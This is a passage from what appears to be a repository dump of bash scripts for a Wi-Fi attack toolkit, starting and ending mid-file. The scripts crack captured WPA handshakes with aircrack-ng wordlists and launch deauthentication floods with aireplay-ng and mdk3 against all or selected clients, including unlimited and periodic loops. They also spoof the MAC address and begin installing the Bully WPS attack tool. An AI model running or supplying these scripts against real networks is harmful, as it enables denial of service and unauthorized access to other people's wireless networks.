]]\n\tthen\n\t\techo -e \"OK.\"\n\t\tsleep 1\n\t\tclear\n\telse\n\t\techo -e \"\"$RS\"File $HANDFT does not exist\"$CE\"\"\n\t\tsleep 2\n\t\tclear\n\t\texec bash $0\n\tfi\n\tcd /root/wordlists\n\tls | sort\n\tcd\n\techo -e \"Enter wordlist name(include extension)(on folder /root/wordlists/): \"\n\tread -e WORDF\n\tWORDFF=\"/root/wordlists/$WORDF\"\n\tif [[ -f \"$WORDFF\" ]]\n\tthen\n\t\techo -e \"OK.\"\n\t\tsleep 1\n\t\tclear\n\telse\n\t\techo -e \"File $WORDF does not exist\"\n\t\tsleep 2\n\t\tclear\n\t\tcontinue\n\tfi\n\n\tclear\n\taircrack-ng -w $WORDFF $HANDFFT\n\techo -e \"$PAKTGB\"\n\t$READAK\n}\nfunction main_handshake_options\n{\nwhile true\ndo\nclear\n\nif [[ -f \"/root/handshakes/*.csv\" ]]\nthen\n\trm /root/handshakes/*.csv\n\trm /root/handshakes/*.netxml\nfi\nTERMINALTITLE=\"HANDSHAKE\"\ndash_calc\nprintf '\\033]2;HANDSHAKE\\a'\nif [[ \"$TARGE\" = \"\" ]]\nthen\n\techo -e \"\"$YS\" 1\"$CE\") Scan networks nearby     Selected:\"$RS\"None\"$CE\"\"\nelse\n\techo -e \"\"$YS\" 1\"$CE\") Scan networks nearby     Selected:\"$YS\"\"$TARGE\"\"$CE\"\"\nfi\necho -e \"\"$YS\" 2\"$CE\") Capture handshake\"\necho -e \"\"$YS\" 3\"$CE\") Aircrack the handshake\"\necho -e \"\"$YS\" 4\"$CE\") Verify a handshake\"\necho -e \"\"$YS\" 5\"$CE\") Clean a handshake\"\necho -e \"\"$YS\" 6\"$CE\") Remove .csv and .netxml files\"\necho -e \"\"$YS\" 0\"$CE\") Exit\"\necho -e \"Choose: \"\nsleep 1\nCH=0\nread -e AA\nclear\nif [[ \"$AA\" = \"1\" ]]\nthen\n\tCH=1\n\tscan_networks\nelif [[ \"$AA\" = \"2\" ]]\nthen\n\tcapture_handshake\nelif [[ \"$AA\" = \"3\" ]]\nthen\n\tif [[ \"$FJC\" = \"1\" ]]\n\tthen\n\t\tAAGAIN=1\n\t\taircrack_handshakejust\n\telse\n\t\tAAGAIN=2\n\t\taircrack_handshake\n\tfi\nelif [[ \"$AA\" = \"4\" ]]\nthen\n\techo -e \"------------------You are in /root/handshakes folder--------------------\"\n\tls /root/handshakes\n\techo -e \"Type the name of the handshake you want to check:(e.g: \"$YS\"hand1-01\"$CE\")\"\n\techo -e \"\"$RS\"No extention\"$CE\"\"\n\tread HANDF\n\tif [[ ! -f /root/handshakes/\"$HANDF\" ]]\n\tthen\n\t\tif [[ -f /root/handshakes/\"$HANDF\".cap ]]\n\t\tthen\n\t\t\tHANDCAP=/root/handshakes/\"$HANDF\".cap\n\t\telse\n\t\t\tif [[ -f /root/handshakes/\"$HANDF\"-01.cap ]]\n\t\t\tthen\n\t\t\t\tHANDCAP=/root/handshakes/\"$HANDF\"-01.cap\n\t\t\telse\n\t\t\t\techo -e \"Handshake file not found!\"\n\t\t\t\tsleep 3\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telse\n\t\tHANDCAP=/root/handshakes/\"$HANDF\"\n\tfi\n\twhile true\n\tdo\n\t\tclear\n\t\techo -e \"\"$BS\"Validate with: \"$CE\"\"\n\t\techo -e \"\"$YS\" 1\"$CE\") Pyrit\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Cowpatty\"\n\t\techo -e \"Choose: \"\n\t\tread VLD\n\t\tif [[ \"$VLD\" = 1 ]]\n\t\tthen\n\t\t\tvalidate_with_pyrit\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tbreak\n\t\telif [[ \"$VLD\" = 2 ]]\n\t\tthen\n\t\t\tvalidate_with_cowpatty\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tbreak\n\t\telif [[ \"$VLD\" = \"b\" || \"$VLD\" = \"back\" || \"$VLD\" = 00 ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\tdone\nelif [[ \"$AA\" = \"5\" ]]\nthen\n\techo -e \"------------------You are in /root/handshakes folder--------------------\"\n\tls /root/handshakes\n\techo -e \"Type the name of the handshake you want to clean:(e.g: \"$YS\"hand1-01\"$CE\")\"\n\techo -e \"\"$RS\"No extention\"$CE\"\"\n\tread HANDF\n\tif [[ ! -f /root/handshakes/\"$HANDF\" ]]\n\tthen\n\t\tif [[ -f /root/handshakes/\"$HANDF\".cap ]]\n\t\tthen\n\t\t\tHANDCAP=/root/handshakes/\"$HANDF\".cap\n\t\telse\n\t\t\tif [[ -f /root/handshakes/\"$HANDF\"-01.cap ]]\n\t\t\tthen\n\t\t\t\tHANDCAP=/root/handshakes/\"$HANDF\"-01.cap\n\t\t\telse\n\t\t\t\techo -e \"Handshake file not found!\"\n\t\t\t\tsleep 3\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telse\n\t\tHANDCAP=/root/handshakes/\"$HANDF\"\n\tfi\n\thandshake_clean\nelif [[ \"$AA\" = \"6\" ]]\nthen\n\trm -f /root/handshakes/*.csv\n\trm -f /root/handshakes/*.netxml\n\tsleep 0.2\n\tclear\n\texec bash \"$0\"\nelif [[ \"$AA\" = \"0\" ]]\nthen\n\texit\nelse\n\tclear\n\tcontinue\nfi\ndone\t\n}\n#-------------------------------------------\ndefaults_lh1\nmain_handshake_options\n"
        },
        {
          "name": "lh2",
          "type": "blob",
          "size": 9.5625,
          "content": "#! /bin/bash\n\n#############DEFAULTS###############\nDPID=$$\necho -e \"$DPID\" > \"$LPATH\"/dpid.txt\n####################################\nprintf '\\033]2;DEAUTH MENU\\a'\nk=1\nREDEAUTH=\"n\"\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\n####################################\nprintf '\\033]2;DEAUTH MENU\\a'\nREDEAUTH=\"n\"\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nfunction find_pid\n{\nj=1\nwhile true\ndo\n\tCURPID=\"dpid\"$j\".txt\"\n\tFINDPID=$(ls \"$LPATH\" | grep \"$CURPID\")\n\tif [[ \"$FINDPID\" == \"\" ]]\n\tthen\n\t\tAVPID=\"$CURPID\"\n\t\tbreak\n\tfi\n\tj=$((j+1))\ndone\n}\nfunction defaults_lh2\n{\n#path for lscript\n\tLPATH=\"/root/lscript\"\n\texport LPATH\n#yellow start \n\tYS=\"\\e[1;33m\"\n#blue start \n\tBS=\"\\e[0;34m\"\n#color end\n\tCE=\"\\e[0m\"\n#red start\n\tRS=\"\\e[1;31m\"\n#black start\n\tBLS=\"\\e[0;30m\"\n#dark gray start\n\tDGYS=\"\\e[1;30m\"\n#light blue start\n\tLBS=\"\\e[1;34m\"\n#green start\n\tGNS=\"\\e[0;32m\"\n#light green start\n\tLGNS=\"\\e[1;32m\"\n#cyan start\n\tCYS=\"\\e[0;36m\"\n#light cyan start\n\tLCYS=\"\\e[1;36m\"\n#light red start\n\tDRS=\"\\e[0;31m\"\n#purple start\n\tPS=\"\\e[0;35m\"\n#light purple start\n\tLPS=\"\\e[1;35m\"\n#brown start\n\tBRS=\"\\e[0;33m\"\n#light gray start\n\tLGYS=\"\\e[0;37m\"\n#white start\n\tWHS=\"\\e[1;37m\"\n#setting frequent stings\n\tYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\n\tYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\n\tYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\n\tPAKT=\"Press \"$YS\"any key$CE to\"\n\tPAKTC=\"Press \"$YS\"any key$CE to continue...\"\n\tPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\tTNI=\"\"$RS\"Tool is not installed. To install it type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"'.\"$CE\"\"\n#code to read from keyboard without return\n\tREADAK=\"read -n 1\"\n}\nfunction option3\n{\nwhile true\ndo\n\t#~ echo -e \"Searching for clients\"\n\tif [[ ! -f \"$HANDFORDEAUTH\" ]]\n\tthen\n\t\techo -e \"\"$RS\"Error 2\"$CE\"\"\n\t\tsleep 2\n\t\tbreak\n\tfi\n\tlines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')\n\tdlines=$((lines-6))\n\tif [[ \"$dlines\" -le 0 ]]\n\tthen\n\t\techo -e \"\"$RS\"No clients found (yet).\"$CE\"\"\n\t\tsleep 2\n\t\tbreak\n\tfi\n\tclear\n\techo -e \"Found $dlines clients.\"\n\tsleep 1\n\tn=1\n\twhile [[ \"$n\" -le \"$dlines\" ]]\n\tdo\n\t\tn1=$((5+n))\n\t\tstation[$n]=$(cat $HANDFORDEAUTH | awk -v nn=\"$n1\" '{FS=\",\"}{if(NR==nn)print $1}')\n\t\tif [[ \"$n\" -ge 10 ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"\"$n\"\"$CE\") \"${station[$n]}\"\"\n\t\telse\n\t\t\techo -e \"\"$YS\" \"$n\"\"$CE\") \"${station[$n]}\"\"\n\t\tfi\n\t\tn=$((n+1))\n\tdone\n\techo -e \"\"$YS\" a\"$CE\") Deauth all clients separately\"\n\techo -e \"\"$YS\" m\"$CE\") Manually type a MAC to deauth\"\n\techo -e \"\"$YS\" r\"$CE\") Refresh\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"Choose: \"\n\tread STATION\n\tclear\n\tif [[ \"$STATION\" = \"m\" ]]\n\tthen\n\t\techo -e \"MAC to deauth: \"\n\t\tread MACTD\n\t\techo -e \"Number of deauths to send(\"$YS\"0\"$CE\"=inf)(\"$YS\"Enter\"$CE\"=0): \"\n\t\tread DEAUTHS\n\t\tif [[ \"$DEAUTHS\" = \"\" ]]\n\t\tthen\n\t\t\tDEAUTHS=0\n\t\tfi\n\t\texport DEAUTHS\n\t\texport TARGB\n\t\texport MACTD\n\t\txterm -geometry 90x15+9999+999999 -e bash -c 'printf \"\\033]2;DEAUTHING\\a\" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown\n\tfi\n\tif [[ \"$STATION\" = \"r\" ]]\n\tthen\n\t\tclear\n\t\tcontinue\n\tfi\n\tif [[ \"$STATION\" = \"a\" ]]\n\tthen\n\t\techo -e \"Number of deauths to send(\"$YS\"0\"$CE\"=inf)(\"$YS\"Enter\"$CE\"=0): \"\n\t\tread DEAUTHS\n\t\tif [[ \"$DEAUTHS\" = \"\" ]]\n\t\tthen\n\t\t\tDEAUTHS=0\n\t\tfi\n\t\tn=1\n\t\twhile [[ \"$n\" -le \"$dlines\" ]]\n\t\tdo\n\t\t\tDSTATION=\"${station[$n]}\"\n\t\t\texport DEAUTHS\n\t\t\texport TARGB\n\t\t\texport DSTATION\n\t\t\txterm -geometry 90x15+9999+999999 -e bash -c 'printf \"\\033]2;DEAUTHING\\a\" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown\n\t\t\tn=$((n+1))\n\t\tdone\n\tfi\n\tif [[ \"$STATION\" = \"b\" ]]\n\tthen\n\t\tbreak\n\tfi\n\tif [[ \"$STATION\" -le \"$dlines\" && \"$STATION\" -ge 1 ]]\n\tthen\n\t\techo -e \"Number of deauths to send(\"$YS\"0\"$CE\"=inf)(\"$YS\"Enter\"$CE\"=0): \"\n\t\tread DEAUTHS\n\t\tif [[ \"$DEAUTHS\" = \"\" ]]\n\t\tthen\n\t\t\tDEAUTHS=0\n\t\tfi\n\t\tDSTATION=\"${station[$STATION]}\"\n\t\texport DEAUTHS\n\t\texport TARGB\n\t\texport DSTATION\n\t\txterm -geometry 90x15+9999+999999 -e bash -c 'printf \"\\033]2;DEAUTHING\\a\" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown\n\tfi\ndone\n}\nfunction pyrit_hand_check\n{\n\tclear\n\techo -e \"Checking handshake with pyrit...\"\n\tTEMP=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null) \n\tTEMPHAND=$(echo \"$TEMP\" | grep \"No valid EAOPL-handshake + ESSID detected.\")\n\tclear\n\tif [[ \"$TEMPHAND\" = \"\" ]]\n\tthen\n\t\tVALIDH=1\n\t\t#TEMPHANDD=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null | grep \"good\")\n\t\tTEMPHANDD=$(echo \"$TEMP\" | grep \"good\")\n\t\tif [[ \"$TEMPHANDD\" = \"\" ]]\n\t\tthen\n\t\t\tTEMPHAD=$(echo \"$TEMP\" | grep \"workable\")\n\t\t\tif [[ \"$TEMPHAD\" = \"\" ]]\n\t\t\tthen\t\n\t\t\t\t#TEMPHANDDD=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null | grep \"bad\")\n\t\t\t\tTEMPHANDDD=$(echo \"$TEMP\" | grep \"bad\")\n\t\t\t\tif [[ \"TEMPHANDDD\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"unknown\"$CE\")\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"bad\"$CE\")\"\n\t\t\t\tfi\n\t\t\t\tsleep 2\n\t\t\telse\n\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"workable\"$CE\")\"\n\t\t\tfi\t\t\t\n\t\telse\n\t\t\techo -e \"Valid handshake found!(Status: \"$YS\"good\"$CE\")\"\n\t\t\tsleep 2\n\t\tfi\n\telse\n\t\tVALIDH=0\n\t\techo -e \"\"$RS\"No handshake found.\"$CE\"\"\n\t\tsleep 2\n\tfi\n}\nfunction cowpatty_hand_check\n{\n\tclear\n\techo -e \"Checking handshake with cowpatty...\"\n\tsleep 1\n\tTEMPHAND=$(cowpatty -c -r \"$HANDCAP\" | grep \"Collected all necessary data to mount crack against WPA2/PSK passphrase.\")\n\tclear\n\tif [[ \"$TEMPHAND\" = \"\" ]]\n\tthen\n\t\tVALIDH=0\n\t\techo -e \"\"$RS\"No handshake found\"$CE\"\"\n\t\tsleep 1\n\telse\n\t\tVALIDH=1\n\t\techo -e \"\"$YS\"Valid handshake found!\"$CE\"\"\n\t\tsleep 2\n\tfi\n}\ndefaults_lh2\nif [[ -f \"$LPATH\"/settings/ignorenegativeone.txt ]]\nthen\n\tread IGN < \"\"$LPATH\"/settings/ignorenegativeone.txt\"\nelse\n\tIGN=\"no\"\nfi\nif [[ \"$IGN\" = \"yes\" ]]\nthen\n\tIGNN=\"--ignore-negative-one\"\nelse\n\tIGNN=\"\"\nfi\n\nwhile true\ndo\n\tclear\n\techo -e \"\"$YS\" 1\"$CE\") Deauth all                      aireplay-ng\"\n\techo -e \"\"$YS\" 2\"$CE\") Deauth all                      mdk3\"\n\techo -e \"\"$YS\" 3\"$CE\") Deauth client/s                 aireplay-ng\"\n\techo -e \"\"$YS\" 4\"$CE\") Deauth all periodically         aireplay-ng\"\n\tif [[ \"$HANDF\" != \"deauth\" ]]\n\tthen\n\t\t#~ if [[ -f \"$LPATH\"/settings/checkauto.txt ]]\n\t\t#~ then\n\t\t\t#~ read checka < \"$LPATH\"/settings/checkauto.txt\n\t\t\t#~ if [[ \"$checka\" == 1 ]]\n\t\t\t#~ then\n\t\t\t\t#~ checkauto=\"Automatic\"\n\t\t\t#~ else\n\t\t\t\t#~ checkauto=\"\"$RS\"Manual\"$CE\"\"\n\t\t\t#~ fi\n\t\t#~ else\n\t\t\t#~ checkauto=\"\"$RS\"Manual\"$CE\"\"\n\t\t#~ fi\t\t\t\t\n\t\techo -e \"\"$YS\" 5\"$CE\") Check handshake quality\" ##          \"$YS\"$checkauto\"$CE\"\"\n\t\techo -e \"\"$YS\" 6\"$CE\") Autocheck for handshake\"\n\t\t#echo -e \"\"$YS\" 7\"$CE\") Empty the file (when big & no handshake)\"\n\tfi\n\t#~ if [[ \"$LASTOPTIONS\" != \"\" ]]\n\t#~ then\n\t\t#~ echo -e \"\"$YS\"ENTER\"$CE\") Last option\"\n\t#~ fi\n\techo -e \"\"$YS\" 0\"$CE\") Exit\"\n\tread DT\n\tif [[ \"$DT\" = 1 ]]\n\tthen\n\t\tPER=0\n\t\techo -e \"Number of deauths to send(\"$YS\"0\"$CE\"=inf)(\"$YS\"Enter\"$CE\"=0): \"\n\t\tread -e DEAUTHS\n\t\tif [[ -z \"$DEAUTHS\" ]]\n\t\tthen\n\t\t\tDEAUTHS=0\n\t\tfi\n\t\tLASTOPTIONS=\"aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit\"\n\t\texport DEAUTHS\n\t\texport TARGB\n\t\tfind_pid\n\t\texport AVPID\n\t\txterm -geometry 90x15+9999+999999 -T \"DEAUTHING\" -e bash -c 'DPID1=$$ && export DPID1 && echo \"$DPID1\" > $LPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown\n\telif [[ \"$DT\" == 4 ]]\n\tthen\n\t\techo -e \"Number of deauths per time: \"\n\t\tread DPT\n\t\tif [[ ! \"$DPT\" -gt 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Invalid number\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tLASTOPTIONS=\"\"\n\t\t\tcontinue\n\t\tfi\n\t\techo -e \"Delay in seconds: \"\n\t\tread DIS\n\t\tif [[ ! \"$DIS\" -gt 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Invalid number\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tLASTOPTIONS=\"\"\n\t\t\tcontinue\n\t\tfi\n\t\texport DIS\n\t\texport DPT\n\t\tclear\n\t\tPER=1\n\t\tLASTOPTIONS=\"4\"\n\t\tfind_pid\n\t\texport AVPID\n\t\txterm -geometry 90x15+9999+999999 -T \"DEAUTHING\" -e 'DPID1=$$ && export DPID1 && echo \"$DPID1\" > $LPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown\n\telif [[ \"$DT\" == 5 ]]\n\tthen\n\t\tif [[ \"$HANDF\" != \"deauth\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Check with pyrit\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Check with cowpatty\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread CHW\n\t\t\t\tif [[ \"$CHW\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tpyrit_hand_check\n\t\t\t\telif [[ \"$CHW\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\tcowpatty_hand_check\n\t\t\t\telif [[ \"$CHW\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tdone\n\t\tfi\n#\telif [[ \"$DT\" == 7 ]]\n#\tthen\n#\t\tif [[ \"$HANDF\" != \"deauth\" ]]\n#\t\tthen\n#\t\t\techo \"\" > /root/handshakes/\"$HANDF\"-01* && echo -e \"Done\"\n#\t\tfi\n\telif [[ \"$DT\" == 6 ]]\n\tthen\n\t\tif [[ \"$HANDF\" != \"deauth\" ]]\n\t\tthen\n\t\t\techo -e \"Interval in seconds(\"$YS\"Enter\"$CE\"=\"$YS\"5\"$CE\"): \"\n\t\t\tread Del\n\t\t\tif [[ \"$Del\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tDel=5\n\t\t\tfi\n\t\t\tif [[ \"$Del\" -gt 0 ]]\n\t\t\tthen\n\t\t\t\texport Del\n\t\t\t\texport HANDCAP\n\t\t\t\txterm -geometry 50x20+0+999999 -T \"AUTOCHECK FOR HANDSHAKE\" -e \"lh21\" & disown\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"Invalid interval\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\tfi\n\t\tfi\n\t#~ elif [[ \"$DT\" == \"\" ]]\n\t#~ then\n\t\t#~ if [[ \"$HANDFORDEAUTH\" != \"\" ]]\n\t\t#~ then\n\t\t\t#~ if [[ \"$LASTOPTIONS\" != \"\" ]]\n\t\t\t#~ then\n\t\t\t\t#~ if [[ \"$LASTOPTIONS\" = 1 ]]\n\t\t\t\t#~ then\n\t\t\t\t\t#~ option3\n\t\t\t\t#~ elif [[ \"$LASTOPTIONS\" = 4 ]]\n\t\t\t\t#~ then\n\t\t\t\t\t#~ xterm -geometry 90x15+9999+999999 -T \"DEAUTHING\" -e \"while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit\" & disown\n\t\t\t\t#~ else\n\t\t\t\t\t#~ xterm -geometry 90x15+9999+999999 -e bash -c \"$LASTOPTIONS; exec bash\" & disown\n\t\t\t\t#~ fi\n\t\t\t#~ fi\n\t\t#~ fi\n\t\t#~ sleep 2\n\telif [[ \"$DT\" = 2 ]]\n\tthen\n\t\techo \"$TARGB\" > /root/mdk3bssid.txt\n\t\tLASTOPTIONS=\"mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC\"\n\t\texport DEAUTHS\n\t\texport TARGB\n\t\tfind_pid\n\t\texport AVPID\n\t\txterm -geometry 90x15+9999+999999 -T \"DEAUTHING WITH MDK3\" -e bash -c 'DPID1=$$ && export DPID1 && echo \"$DPID1\" > $LPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown\n\telif [[ \"$DT\" = 3 ]]\n\tthen\n\t\tLASTOPTIONS=1\n\t\toption3\n\telif [[ \"$DT\" = 0 ]]\n\tthen\n\t\texit\n\tfi\ndone\n"
        },
        {
          "name": "lh21",
          "type": "blob",
          "size": 0.9619140625,
          "content": "#!/bin/bash\nDPIDDD=$$\necho $DPIDDD > /root/lscript/dpiddd.txt\ni=1\ndelay=\"$Del\"\nif [[ \"$delay\" == \"\" ]]\nthen\n\tdelay=5\nfi\nwhile [[ \"$i\" == 1 ]]\ndo\n\tTEMP=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null)\n\tTEMPHANDD=$(echo \"$TEMP\" | grep \"good\")\n\tTEMPHAND=$(echo \"$TEMP\" | grep \"workable\")\n\tif [[ \"$TEMPHANDD\" == \"\" && \"$TEMPHAND\" == \"\" ]]\n\tthen\n\t\tprintf \".\"\t\n\telse\n\t\tclear\n\t\techo -e \"HANDSHAKE FOUND!\"\n\t\tsleep 2\n\t\techo -e \"Exiting terminals...\"\n\t\tsleep 1\n\t\tif [[ -f \"$LPATH\"/dpid.txt ]]\n\t\tthen\n\t\t\tread DPID < \"$LPATH\"/dpid.txt\n\t\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\t\tif [[ \"$PIF\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tkill $DPID\n\t\t\tfi\n\t\tfi\n\t\tbreak\n\tfi\n\tsleep \"$delay\"\ndone\nj=1\nwhile true\ndo\n\tPIDSE=\"dpid\"$j\".txt\"\n\tif [[ -f \"$LPATH\"/\"$PIDSE\" ]]\n\tthen\n\t\tread DPID < \"$LPATH\"/\"$PIDSE\"\n\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\tif [[ \"$PIF\" != \"\" ]]\n\t\tthen\n\t\t\tkill $DPID\n\t\tfi\n\telse\n\t\trm \"$LPATH\"/dpid*\n\t\tbreak\n\tfi\n\tj=$((j+1))\ndone\nif [[ -f \"$LPATH\"/dpidd.txt ]]\nthen\n\tread DPID2 < /root/lscript/dpidd.txt\n\tkill -INT $DPID2\nfi\nexit\n\n"
        },
        {
          "name": "lh3",
          "type": "blob",
          "size": 26.8623046875,
          "content": "#! /bin/bash\n\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nSCW=1\nfunction defaults_lh3\n{\n#path for lscript\n\tLPATH=\"/root/lscript\"\n\texport LPATH\n#path for keyboard shortcuts\n\tKSPATH=\"\"$LPATH\"/ks\"\n\texport KSPATH\n#making sure the kspath is set\n\tif [[ ! -d \"$KSPATH\" ]]\n\tthen\n\t\tmkdir \"$KSPATH\"\n\tfi\n#ALFA SUPPORT SETTING\n\tif [[ -f \"$LPATH\"/settings/AWUS036ACH.txt ]]\n\tthen\n\t\tread ALFA < \"$LPATH\"/settings/AWUS036ACH.txt\n\telse\n\t\tALFA=\"no\"\n\tfi\n#yellow start \n\tYS=\"\\e[1;33m\"\n#blue start \n\tBS=\"\\e[0;34m\"\n#color end\n\tCE=\"\\e[0m\"\n#red start\n\tRS=\"\\e[1;31m\"\n#black start\n\tBLS=\"\\e[0;30m\"\n#dark gray start\n\tDGYS=\"\\e[1;30m\"\n#light blue start\n\tLBS=\"\\e[1;34m\"\n#green start\n\tGNS=\"\\e[0;32m\"\n#light green start\n\tLGNS=\"\\e[1;32m\"\n#cyan start\n\tCYS=\"\\e[0;36m\"\n#light cyan start\n\tLCYS=\"\\e[1;36m\"\n#light red start\n\tDRS=\"\\e[0;31m\"\n#purple start\n\tPS=\"\\e[0;35m\"\n#light purple start\n\tLPS=\"\\e[1;35m\"\n#brown start\n\tBRS=\"\\e[0;33m\"\n#light gray start\n\tLGYS=\"\\e[0;37m\"\n#white start\n\tWHS=\"\\e[1;37m\"\n#setting custom color for logo\n\tif [[ -f \"$LPATH\"/settings/logocolor.txt ]]\n\tthen\n\t\tread COL < \"$LPATH\"/settings/logocolor.txt\n\telse\n\t\tCOL=\"$RS\"\n\tfi\n#setting frequent stings\n\tYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\n\tYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\n\tYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\n\tPAKT=\"Press \"$YS\"any key$CE to\"\n\tPAKTC=\"Press \"$YS\"any key$CE to continue...\"\n\tPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\tTNI=\"\"$RS\"Tool is not installed. To install it type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"'.\"$CE\"\"\n#code to read from keyboard without return\n\tREADAK=\"read -n 1\"\n#default MAC when starting monitor\n\tDEFMAC=\"00:11:22:33:44:55\"\n\t\n\twififb=\"wififb\"\n\t\n#default packets to inject per second on wps unlock with mdk3\n\tDPPS=400\n}\nfunction enable2_wlan\n{\n\techo -e \"Enabling $WLANN...\"\n\trfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null\n\tifconfig $WLANN up &>/dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O4=1  || echo -e \"\"$RS\"Error. I can't find your wireless adapter\"$CE\"\"\n}\nfunction start2_menu\n{\n\techo -e \"Enabling $WLANNM...\"\n\tenable2_wlan\n\techo -e \"Killing services...\"\n\tairmon-ng check kill &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O1=1\n\techo -e \"Starting monitor mode...\"\n\tif [[ \"$ALFA\" = \"yes\" ]]\n\tthen\n\t\tifconfig $WLANN down\n\t\tiwconfig $WLANN mode monitor &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\t\tifconfig $WLANN up\n\telse\n\t\tairmon-ng start $WLANN | grep \"monitor mode\" | awk -F \"(\" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\tfi\n\techo -e \"Changing mac address of $WLANNM to 00:11:22:33:44:55...\"\n\tifconfig $WLANNM down\n\tmacchanger -m 00:11:22:33:44:55 $WLANNM | grep \"New MAC:\" &> /dev/null && O3=1\n\tifconfig $WLANNM up && echo -e \"\"$YS\"Done\"$CE\"\" \n}\nfunction stop2_menu\n{\n\tstop2_monitor\n\techo -e \"Changing mac address of $WLANN to the original one...\"\n\tifconfig $WLANN down\n\tmacchanger -p $WLANN | grep \"Current MAC:\" && O1=1\n\tifconfig $WLANN up\n\techo -e \"\"$YS\"Done\"$CE\"\"\n}\nfunction stop2_monitor\n{\n\techo -e \"Disabling $WLANNM...\"\n\techo -e \"Stopping monitor mode...\"\n\tif [[ \"$ALFA\" = \"yes\" ]]\n\tthen\n\t\tA1=0\n\t\tA2=0\n\t\tA3=0\n\t\tifconfig $WLANN down && A1=1\n\t\tiwconfig $WLANN mode managed && A2=1\n\t\tifconfig $WLANN up && A3=1\n\t\tif [[ \"$A1\" = 1 && \"$A2\" = 1 && \"$A3\" = 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\t\telse\n\t\t\techo -e \"\"$RS\"Error stoping monitor mode.\"$CE\"\"\n\t\tfi\n\telse\n\t\tairmon-ng stop $WLANNM &>/dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1 || echo -e \"\"$RS\"Error stoping monitor mode.\"$CE\"\"\n\tfi\n\techo -e \"Starting network-manager service...\"\n\tservice network-manager start && echo -e \"\"$YS\"Done\"$CE\"\" && O3=1 || echo -e \"\"$RS\"Error starting network-manager service\"$CE\"\"\n}\nfunction install_bully\n{\n\tif [[ -d \"/root/bully\" ]]\n\tthen\n\t\techo -e \"Removing old...\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\trm -r /root/bully\n\tfi\t\t\t\t\n\techo -e \"Installing Bully\"\n\techo -e \"Tool by Aanarchyy\"\n\tcd\n\tgit clone 